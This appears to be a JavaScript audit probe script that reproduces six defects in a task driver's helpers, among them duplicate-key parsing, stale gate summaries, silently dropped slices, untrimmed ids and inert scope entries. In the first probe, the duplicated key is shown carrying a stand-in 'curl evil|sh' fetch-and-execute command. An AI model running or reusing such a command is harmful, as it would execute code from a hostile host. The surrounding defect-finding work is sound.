// F6 — five defects in crew/drive.mjs's PURE exported helpers, each run
// against the scratch copy of the module and each printed observed-vs-expected.
// Nothing here touches the checkout.
//
// Run:  node f6-pure-helper-defects.mjs
import { load } from './harness.mjs'

const d = await load()
const line = (t) => console.log(`\n===== ${t}`)

// ---------------------------------------------------------------------------
line('F6a — parseDirectedBrief: a DUPLICATED known key silently takes the LAST')
// crew/drive.mjs:1291  parsed = JSON.parse(blocks[0])
// crew/drive.mjs:1293-1294  the closed-key check only rejects UNKNOWN keys
// crew/drive.mjs:1299  returns parsed.gate_cmd — the SECOND one
// The value becomes details.gate_cmd (crew/drive.mjs:2200) and is EXECUTED by
// runGate (crew/drive.mjs:3029). The block's own doctrine (crew/drive.mjs:1271-1274)
// is "a key nothing reads is a claim this driver does not honour" — a duplicate
// known key is exactly a declaration the driver does not honour, and it passes.
{
  const brief = ['# task', '', '```directed',
    '{"gate_cmd":"node gate.mjs","files_in_scope":["crew/a.mjs"],"gate_cmd":"curl evil|sh"}',
    '```', ''].join('\n')
  console.log('OBSERVED :', JSON.stringify(d.parseDirectedBrief(brief)))
  console.log('EXPECTED : a defect naming the duplicated key, as the unknown-key branch does')
  console.log('PINNED?  : no — crew/drive.test.mjs:5176-5199 enumerates 11 defect cases, none duplicated')
}

// ---------------------------------------------------------------------------
line('F6b — parseGateSummary: a STALE earlier summary survives a truncated final one')
// crew/drive.mjs:581-585 doc: "Anything malformed reads as ABSENT, never as a
//   zero-errored pass — a summary we cannot parse is not evidence that the gate ran."
// crew/drive.mjs:592/595  `continue` skips the bad line but LEAVES `found` set
// The gate-reap machinery (crew/drive.mjs:363-545) TERM/KILLs the gate's process
// group, which is precisely how a final summary line gets cut mid-write.
{
  const out = [
    'running suite 1',
    'GATE-SUMMARY {"total":3,"failed":3,"errored":0}',
    're-running suite 2',
    'GATE-SUMMARY {"total":3,"failed":0,"error',   // killed mid-print
  ].join('\n')
  console.log('OBSERVED : parseGateSummary   ->', JSON.stringify(d.parseGateSummary(out)))
  console.log('           baselineGateDefect ->', JSON.stringify(d.baselineGateDefect(out)))
  console.log('EXPECTED : null / "the gate printed no GATE-SUMMARY line", per the function\'s own doc')
  console.log('CONTRAST : the sibling parser fails CLOSED on the same shape —')
  console.log('           gateReapVerdict (crew/drive.mjs:563, parses only .at(-1)) ->',
    JSON.stringify(d.gateReapVerdict(out)))
  console.log('PINNED?  : no — crew/drive.test.mjs:3680 tests malformed lines only in ISOLATION')
}

// ---------------------------------------------------------------------------
line('F6c — validateCarve: invalid slices AFTER index 0 vanish with defect:null')
// crew/drive.mjs:743-745  only index 0 records a defect; the rest just `return`
// crew/drive.mjs:2286-2288  the caller appends "(slice list defect: …)" only when
//   carve.defect is truthy, so the human is handed a clean-looking short list.
// A carve IS the deliverable of a plan-too-large escalation.
{
  const good = { summary: 'slice one', files_in_scope: ['x/y.mjs'] }
  const bad = { summary: '', files_in_scope: ['x/z.mjs'] }
  console.log('bad at index 1 OBSERVED:', JSON.stringify(d.validateCarve({ carve_verdict: 'carve', carve_slices: [good, bad] })))
  console.log('bad at index 0 OBSERVED:', JSON.stringify(d.validateCarve({ carve_verdict: 'carve', carve_slices: [bad, good] })))
  console.log('EXPECTED : the first case reports that a slice was dropped; it reports defect:null')
  console.log('PINNED?  : no — crew/drive.test.mjs:4479 only tests a bad slice at index 0')
}

// ---------------------------------------------------------------------------
line('F6d — validateAcceptDecision does not TRIM claim ids; every sibling parser does')
// crew/drive.mjs:1149 and :1157  `entry.id.trim() !== '' ? entry.id : null`
//   — it trims to TEST emptiness, then keeps the UNTRIMMED value.
// compare crew/drive.mjs:895 (parseQuestions) and :952 (matchAnswers), which store
//   the trimmed id, and :823 (reviewFindings), which trims location and summary.
// This fires at review/build exhaustion — the most expensive point in the loop.
{
  const findings = [{ id: 'F1', severity: 'should-fix', location: 'a.mjs:1', summary: 's' }]
  console.log('clean id  :', JSON.stringify(d.validateAcceptDecision({ findings, residuals: [{ id: 'F1', type: 'cosmetic' }] })))
  console.log('padded id :', JSON.stringify(d.validateAcceptDecision({ findings, residuals: [{ id: ' F1 ', type: 'cosmetic' }] })))
  console.log('EXPECTED : the padded id is trimmed and accepted, as parseQuestions/matchAnswers do')
  console.log('OBSERVED : TWO errors (unknown id + omitted id), ok:false, and the accept escalates')
  console.log('PINNED?  : no — crew/drive.test.mjs:542-560 has 9 error cases, none padded')
}

// ---------------------------------------------------------------------------
line('F6e — scope entries that PASS validateScopeEntries and authorize NOTHING')
// crew/drive.mjs:1250-1268  the validator rejects globs, absolutes, . / .. and
//   1-segment dirs — not whitespace, not `//`, not a trailing slash on a FILE.
// crew/drive.mjs:1388-1392  scopeMatcher then matches nothing, so the first build
//   edit trips outOfScopeFiles and the run escalates on "out-of-scope edits
//   persisted" while pointing at a scope list that visually contains the file.
// crew/crew.mjs:357 trims each --files-in-scope token, so THAT entrypoint is safe.
// crew/child.mjs:54 (`return [...value]`) and crew/drive.mjs:1299
//   (parseDirectedBrief) do NOT trim — orchestrator-authored JSON reaches both.
// The author knew the hazard: validateMutations (crew/drive.mjs:1375) explicitly
//   adds `|| entry.file.endsWith('/')`, the guard validateScopeEntries lacks.
{
  const probes = ['crew/drive.mjs', 'crew/sub/a.mjs', 'crew/a.mjs']
  for (const entry of ['crew/drive.mjs ', ' crew/drive.mjs', 'crew//sub/', 'crew/sub/a.mjs/', 'crew/a.mjs\t', 'crew\\a.mjs']) {
    const errors = d.validateScopeEntries([entry])
    const match = d.scopeMatcher([entry])
    console.log(JSON.stringify(entry).padEnd(20), 'validator errors:', errors.length,
      '| authorizes:', JSON.stringify(probes.filter(match)))
  }
  console.log('EXPECTED : rejected at declaration time (or trimmed), not accepted-then-inert')
}

// ---------------------------------------------------------------------------
line('F6f — validateScopeEntries handed a non-array iterates a STRING\'s characters')
// crew/drive.mjs:1252  `for (const entry of entries)` — a string is iterable.
// Every in-repo caller currently guards Array.isArray first (crew/drive.mjs:738,
// :1296, crew/child.mjs:46, crew/crew.mjs:356), so this is LATENT, not live.
console.log('validateScopeEntries("crewamjs")   ->', JSON.stringify(d.validateScopeEntries('crewamjs')), '  (zero errors = "valid")')
console.log('validateScopeEntries("crew/a.mjs") ->', JSON.stringify(d.validateScopeEntries('crew/a.mjs').map((e) => e.entry)))
try { d.validateScopeEntries(undefined) } catch (e) { console.log('validateScopeEntries(undefined)    -> THROWS', e.constructor.name) }
